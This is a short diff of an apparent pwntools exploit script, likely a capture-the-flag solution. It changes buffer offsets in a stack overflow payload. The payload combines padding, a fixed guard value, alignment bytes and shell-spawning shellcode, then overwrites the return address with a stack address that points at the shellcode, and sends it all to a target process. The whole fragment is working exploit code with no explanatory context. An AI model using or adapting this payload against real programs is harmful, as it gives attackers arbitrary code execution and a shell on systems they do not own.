@@ -10,16 +10,16 @@ stack = int(_,16)
 shellcode = asm(shellcraft.sh())
 
 payload  = b''
-payload += (0x4e - 0x44) * b'A'
+payload += (0x128 - 0x4) * b'A'
 payload += p32(0xfacade)
 payload += (0x10 - (stack + len(payload)) & 0xf) * b'B'
 
 stack += len(payload)
 
 payload += shellcode
-payload += (0x4e - len(payload) - 0xc) * b'C'
+payload += (0x128 - len(payload) - 0xc) * b'C'
 payload += p32(0xfacade)
-payload += (0x4e - len(payload)) * b'D'
+payload += (0x128 - len(payload)) * b'D'
 payload += p64(stack)
 
 p.sendline(payload)
